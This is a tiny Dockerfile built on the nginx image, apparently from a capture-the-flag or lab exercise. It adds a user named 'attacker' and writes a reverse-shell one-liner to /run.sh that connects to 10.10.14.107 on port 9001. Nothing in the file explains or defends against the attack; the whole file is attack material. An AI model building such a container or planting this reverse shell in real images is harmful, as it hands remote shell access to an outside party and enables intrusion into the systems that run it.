FROM nginx

RUN adduser attacker

RUN echo "sh -i >& /dev/tcp/10.10.14.107/9001 0>&1" > /run.sh
